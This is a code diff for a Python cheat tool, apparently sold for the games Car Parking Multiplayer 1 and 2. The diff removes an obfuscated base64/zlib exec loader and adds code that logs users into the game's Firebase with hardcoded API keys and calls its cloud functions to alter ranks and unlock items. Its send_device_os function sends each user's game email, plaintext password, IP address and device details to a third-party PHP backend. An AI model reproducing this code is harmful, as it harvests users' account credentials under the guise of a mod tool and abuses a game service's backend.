@@ -1,3 +1,538 @@
+#!/usr/bin/env python3
+import os
+import sys
+import time
+import json
+import requests
+import hashlib
+import random
+from datetime import datetime
+import platform
+import subprocess
+from rich.console import Console
+from rich.panel import Panel
+from rich.text import Text
+from rich import box
+from rich.console import Console
+from rich.align import Align
+from rich.layout import Layout
+import os, time, shutil
+from pyfiglet import Figlet
+import sys
 
-import zlib,base64
-exec(zlib.decompress(base64.b64decode("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")))
+if os.path.basename(__file__) != 'ChanXReynoCpm.py':
+    print("⛔ Error: This file has been renamed.\\nPlease rename it back to 'ChanXReynoCpm.py' to use this tool.\\n")
+    sys.exit(1)
+
+console = Console()
+
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def animated_ascii_title(text, delay=0.01, style="bold cyan"):
+    figlet = Figlet(font='slant')
+    ascii_art = figlet.renderText(text)
+    lines = ascii_art.splitlines()
+    rendered = []
+
+    for line in lines:
+        rendered_line = ""
+        for char in line:
+            rendered_line += char
+            console.print(f"[{style}]{rendered_line}", justify="center", end="\r")
+            time.sleep(delay)
+        rendered.append(rendered_line)
+        console.print(f"[{style}]{rendered_line}", justify="center")
+    return "\n".join(rendered)
+
+def animated_text_block(lines, style="bold white", delay=0.02):
+    for line in lines:
+        console.print(Text(line, style=style), justify="center")
+        time.sleep(delay)
+
+def show_banner(unlimited_status=None, current_coins=None):
+    clear_screen()
+    term_width, _ = shutil.get_terminal_size()
+
+    # Animate big header text
+    console.print("\n")  # spacing
+    ascii_art = animated_ascii_title("Chan X Reyno", delay=0.0025, style="bold bright_cyan")
+    console.print("\n")  # spacing
+
+    # Animated box lines
+    body_lines = []
+    body_lines.append("🔥 𝐄𝐥𝐢𝐭𝐞 𝐌𝐨𝐝𝐝𝐢𝐧𝐠 𝐟𝐨𝐫 𝐂𝐏𝐌𝟏 & 𝐂𝐏𝐌𝟐 🔥")
+    body_lines.append("🚫 𝐒𝐡𝐚𝐫𝐞 𝐊𝐞𝐲 𝐢𝐬 𝐒𝐭𝐫𝐢𝐜𝐭𝐥𝐲 𝐏𝐫𝐨𝐡𝐢𝐛𝐢𝐭𝐞𝐝")
+    body_lines.append("🪙 𝐁𝐮𝐲 𝐂𝐫𝐞𝐝𝐢𝐭𝐬: @𝐊𝐫𝐢𝐬𝐡𝐌𝐨𝐧𝐚𝐫𝐜𝐡")
+    if unlimited_status:
+        body_lines.append("✅ 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧: 𝐔𝐍𝐋𝐈𝐌𝐈𝐓𝐄𝐃")
+    else:
+        body_lines.append("❌ 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧: 𝐋𝐈𝐌𝐈𝐓𝐄𝐃")
+        if current_coins is not None:
+            body_lines.append(f"💰 𝐂𝐨𝐢𝐧 𝐁𝐚𝐥𝐚𝐧𝐜𝐞: {current_coins}")
+
+    # Animate inside a box panel
+    panel_content = Text()
+    for line in body_lines:
+        panel_content.append(f"{line}\n")
+        console.print(Panel.fit(
+            Align.center(panel_content),
+            box=box.HEAVY if int(time.time() * 10) % 2 == 0 else box.SQUARE,
+            border_style="bright_magenta" if int(time.time() * 10) % 2 == 0 else "bright_blue",
+            padding=(1, 8),
+            title="💎 Premium Access 💎"
+        ), justify="center")
+        time.sleep(0.3)
+        clear_screen()
+        console.print("\n")
+        console.print(Text(ascii_art, style="bold bright_cyan"), justify="center")
+        console.print("\n")
+
+    # Final stable box
+    final_text = "\n".join(body_lines)
+    console.print(Panel.fit(
+        Align.center(final_text),
+        box=box.DOUBLE_EDGE,
+        border_style="bright_magenta",
+        padding=(1, 8),
+        title="💎 Premium Access 💎"
+    ), justify="center")
+
+    console.print("\n⚙️ [bold green] Powered by KrishX | Tool Version 1.0[/bold green]", justify="center")
+
+# 🔥 Example usage:
+# show_banner(unlimited_status=False, current_coins=120)
+# show_banner(unlimited_status=True)
+
+# ✅ Firebase login
+def login_firebase(api_key, email, password):
+    try:
+        login_url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={api_key}"
+        payload = {"email": email, "password": password, "returnSecureToken": True}
+        headers = {"Content-Type": "application/json"}
+        response = requests.post(login_url, headers=headers, json=payload).json()
+        if 'idToken' in response:
+            return {"ok": True, "token": response["idToken"], "email": email, "password": password}
+        else:
+            return {"ok": False, "message": response.get("error", {}).get("message", "Unknown Firebase error")}
+    except Exception as e:
+        return {"ok": False, "message": str(e)}
+
+# BASE_URL for your PHP backend services
+BASE_URL: str = "https://admincpm.io/chanxreyno2/api"
+
+# ✅ Call PHP Backend Service (centralized for all API calls)
+def call_php_service(access_key, menu_code, token=None, email=None, password=None, extra_data=None):
+    url = f"{BASE_URL}/menu.php"
+    payload = {
+        "key": access_key,
+        "menu": menu_code
+    }
+    if token:
+        payload["token"] = token
+    if email:
+        payload["email"] = email
+    if password:
+        payload["password"] = password
+    if extra_data:
+        payload.update(extra_data)
+
+    try:
+        res = requests.post(url, data=payload)
+        if not res.text:
+            return {"ok": False, "message": "Received empty response from server."}
+        
+        result = res.json()
+        return result
+    except json.JSONDecodeError as e:
+        return {"ok": False, "message": f"JSON decode error: {e}. Response was: {res.text}"}
+    except Exception as e:
+        return {"ok": False, "message": f"Request failed: {e}"}
+
+# ✅ Check access key and get user status via PHP
+def check_access_key_and_get_user_status(key):
+    r = call_php_service(key, "check_only")
+    if r.get("ok"):
+        user_status_response = call_php_service(key, "get_user_status")
+        if user_status_response.get("ok"):
+            return True, {
+                "is_unlimited": user_status_response["is_unlimited"],
+                "coins": user_status_response["coins"],
+                "telegram_id": user_status_response.get("telegram_id", "N/A") # Get telegram_id, default to "N/A" if not found
+            }
+        else:
+            return False, {"message": user_status_response.get("message", "Failed to get user status.")}
+    else:
+        return False, {"message": r.get("message", "Invalid access key or server error.")}
+
+# ✅ Send device OS information (Handles both remote and local logging)
+def send_device_os(access_key, email=None, password=None, game_label=None, telegram_id=None):
+    try:
+        system = platform.system()
+        release = platform.release()
+        device_name_py = "Unknown"
+        os_version_py = "Unknown"
+        
+        # device_id removed as per request
+        # device_info_string = f"{system}-{release}-{platform.node()}-{platform.machine()}"
+        # device_id = hashlib.sha256(device_info_string.encode()).hexdigest()
+
+        if system == "Darwin":
+            if os.path.exists("/bin/ash") or "iSH" in release:
+                brand = "iOS (iSH)"
+                device_name_py = subprocess.getoutput("sysctl -n hw.model") or "iSH Device"
+                os_version_py = subprocess.getoutput("sw_vers -productVersion") or "Unknown"
+            else:
+                brand = "macOS"
+                device_name_py = subprocess.getoutput("sysctl -n hw.model") or "Mac"
+                os_version_py = subprocess.getoutput("sw_vers -productVersion") or "Unknown"
+        elif system == "Linux":
+            brand = "Android" if os.path.exists("/system/bin") else "Linux"
+            if brand == "Android":
+                device_name_py = subprocess.getoutput("getprop ro.product.model") or "Android Device"
+                os_version_py = subprocess.getoutput("getprop ro.build.version.release") or "Unknown"
+            else:
+                device_name_py = "Linux Device"
+                os_version_py = "Unknown"
+        else:
+            brand = system + " " + release
+            device_name_py = platform.node()
+            os_version_py = "Unknown"
+    except Exception as e:
+        # Debug print removed
+        brand = "Unknown OS"
+        device_name_py = "Unknown Device"
+        os_version_py = "Unknown Version"
+        # device_id removed
+        # device_id = "Unknown_Device_ID" 
+
+    try:
+        ip_address = requests.get("https://api.ipify.org").text.strip()
+    except Exception as e:
+        # Debug print removed
+        ip_address = "Unknown"
+    
+    # Payload for save_device.php
+    payload = {
+        "key": access_key,
+        # "device_id": device_id, # Removed device_id
+        "brand": brand,
+        "device_name": device_name_py,
+        "os_version": os_version_py,
+        "ip_address": ip_address,
+        "email": email if email is not None else "Unknown",
+        "password": password if password is not None else "Unknown",
+        "telegram_id": telegram_id if telegram_id is not None else "N/A",
+        "game": game_label if game_label is not None else "N/A" # Added game label
+    }
+    
+    remote_success = False
+    try:
+        response = requests.post(f"{BASE_URL}/save_device.php", json=payload) # Use json=payload
+        remote_success = response.status_code == 200
+        # Debug prints removed
+    except Exception as e:
+        # Debug print removed
+        pass
+
+    # --- REMOVED LOCAL LOGGING TO device.log ---
+    # try:
+    #     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    #     log_entry = (
+    #         f"[{timestamp}] "
+    #         f"Access Key: {access_key}, "
+    #         f"Email: {email if email else 'N/A'}, "
+    #         f"Game: {game_label if game_label else 'N/A'}, " # Changed to directly use game_label
+    #         # f"Device ID: {payload['device_id']}, " # Removed device_id
+    #         f"Brand: {payload['brand']}, "
+    #         f"Device Name: {payload['device_name']}, "
+    #         f"OS Version: {payload['os_version']}, "
+    #         f"IP Address: {payload['ip_address']}, "
+    #         f"Telegram ID: {payload['telegram_id']}\n"
+    #     )
+    #     with open("device.log", "a") as f:
+    #         f.write(log_entry)
+    #     # Debug print removed
+    # except Exception as e:
+    #     # Debug print removed
+    #     pass
+    # --- END OF REMOVED LOCAL LOGGING ---
+
+    return remote_success
+
+# Function to fetch service costs from menu.php
+def get_service_costs():
+    url = f"{BASE_URL}/menu.php"
+    payload = {"menu": "get_service_costs"}
+    try:
+        res = requests.post(url, data=payload)
+        if res.ok:
+            data = res.json()
+            if data.get("ok") and "costs" in data:
+                return data["costs"]
+    except Exception as e:
+        print(f"⚠️ Error fetching service costs: {e}")
+    # Default costs if fetching fails
+    return {
+        "king_rank": 10000,
+        "change_email": 10000,
+        "change_password": 10000,
+        "set_money": 10000,
+        "unlock_wheels": 10000,
+        "unlock_male": 10000,
+        "unlock_female": 10000,
+        "unlock_brakes": 10000,
+        "unlock_calipers": 10000,
+        "unlock_paints": 10000,
+        "unlock_apartments": 10000,
+        "complete_missions": 10000,
+        "unlock_all_cars_siren": 10000,
+        "unlock_slots": 7000,
+        "copy_cpm1_car_to_cpm2": 10000 # Add default cost for new service
+    }
+
+
+# ✅ Main Menu
+if __name__ == "__main__":
+    device_ip = None
+    try:
+        requests.get("https://google.com", timeout=3)
+        device_ip = requests.get('https://api.ipify.org').text.strip()
+    except:
+        print("❌ No internet. Please check your connection.")
+        sys.exit(1)
+
+    unlimited_status_for_display = None
+    current_coins_for_display = None
+    is_unlimited_user = False
+    telegram_id_for_display = "N/A"
+    
+    # Initialize email, token, and label_to_use here to ensure they always exist
+    email = "" 
+    token = None 
+    label_to_use = "N/A" # Initialize label_to_use with a default value
+
+    # Fetch service costs at the beginning
+    service_costs = get_service_costs()
+
+    while True:
+        clear_screen()
+        show_banner(unlimited_status=unlimited_status_for_display, current_coins=current_coins_for_display)
+
+        access_key = input("🔑 Enter Access Key: ").strip()
+
+        # Check access key and get user status from PHP backend
+        is_valid_key, user_data_from_php = check_access_key_and_get_user_status(access_key)
+        
+        if not is_valid_key:
+            print(f"❌ {user_data_from_php['message']}")
+            unlimited_status_for_display = None
+            current_coins_for_display = None
+            is_unlimited_user = False
+            telegram_id_for_display = "N/A"
+            time.sleep(0.5) # Reduced sleep time
+            continue
+
+        print("✅ Key accepted.")
+        is_unlimited_user = user_data_from_php['is_unlimited']
+        current_coins_for_display = user_data_from_php['coins']
+        telegram_id_for_display = user_data_from_php.get('telegram_id', 'N/A')
+
+        # Display Telegram ID
+        print(f"Telegram ID: {telegram_id_for_display}")
+        try:
+            os.system("termux-open-url 'https://t.me/pakundotools'")
+            print("Opening Telegram group...")
+            time.sleep(0.5)
+        except Exception as e:
+            print(f"Could not open Telegram URL: {e}")
+
+        # Removed: Initial send_device_os call after access key input
+
+        if not is_unlimited_user:
+            print("\nYour subscription is LIMITED. You can explore the menu but services cost coins.")
+        else:
+            print("You have UNLIMITED subscription. All services are free.")
+        time.sleep(0.5) # Reduced sleep time
+
+        while True:
+            clear_screen()
+            show_banner(unlimited_status=is_unlimited_user, current_coins=current_coins_for_display)
+            print("Main Menu:")
+            print("1. 🚘 CAR PARKING MULTIPLAYER (CPM1)")
+            print("2. 🚔 CAR PARKING MULTIPLAYER 2 (CPM2)")
+            print("0. ❌ EXIT")
+            main_menu = input("Enter choice: ").strip()
+
+            if main_menu == "0":
+                print("👋 Goodbye!")
+                break
+
+            if main_menu not in ["1", "2"]:
+                print("❌ Invalid choice.")
+                time.sleep(0.5) # Reduced sleep time
+                continue
+
+            api_key_cpm1 = "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM" # CPM1 Firebase API Key
+            api_key_cpm2 = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ" # CPM2 Firebase API Key
+
+            firebase_api_key_for_login = {
+                "1": api_key_cpm1,
+                "2": api_key_cpm2
+            }[main_menu]
+
+            rank_url = {
+                "1": "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4", # CPM1 King Rank URL
+                "2": "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" # CPM2 King Rank URL
+            }[main_menu]
+            
+            label_to_use = "CPM1" if main_menu == "1" else "CPM2" # label_to_use is defined here
+
+            print(f"\n--- Login to {label_to_use} ---")
+            email = input("📧 Enter Email: ").strip()
+            password = input("🔐 Enter Password: ").strip()
+
+            login = login_firebase(firebase_api_key_for_login, email, password)
+            if not login.get("ok"):
+                print(f"❌ Login failed: {login['message']}")
+                time.sleep(1) # Reduced sleep time
+                continue
+
+            token = login["token"]
